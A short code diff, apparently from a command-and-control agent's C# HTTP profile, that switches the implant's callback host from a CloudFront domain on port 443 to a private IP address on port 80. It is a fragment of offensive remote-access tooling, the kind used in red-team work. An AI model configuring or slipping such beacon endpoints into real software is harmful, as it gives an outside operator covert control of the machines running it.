@@ -34,8 +34,8 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("443");
-            string callbackHost = "https://d2wxnnb4dqibh4.cloudfront.net";
+            int callbackPort = Int32.Parse("80");
+            string callbackHost = "http://10.30.25.21";
             string getUri = "q";
             string queryPath = "index";
             string postUri = "data";
